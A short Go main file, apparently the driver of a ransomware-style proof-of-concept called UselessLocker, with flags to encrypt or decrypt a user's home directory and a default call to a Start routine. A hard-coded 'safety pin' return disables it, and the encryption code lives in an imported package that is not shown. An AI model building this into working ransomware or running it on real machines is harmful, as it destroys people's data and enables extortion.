package main

import (
	"flag"
	"log"

	"github.com/TheCreeper/UselessLocker/useless"
)

var (
	Encrypt  bool
	Decrypt  bool
	Password string
)

func init() {
	flag.BoolVar(&Encrypt, "e", false, "Encrypt your home directory using the provided key.")
	flag.BoolVar(&Decrypt, "d", false, "Decrypt your home directory using the provided key.")
	flag.StringVar(&Password, "p", "", "The key that is used to encrypt/decrypt files.")
	flag.Parse()
}

func main() {
	// Safety pin
	if true {
		return
	}

	if Encrypt {
		if err := useless.EncryptHome([]byte(Password)); err != nil {
			log.Fatal(err)
		}
		return
	}

	if Decrypt {
		if err := useless.DecryptHome([]byte(Password)); err != nil {
			log.Fatal(err)
		}
		return
	}

	if err := useless.Start(); err != nil {
		log.Fatal(err)
	}
}
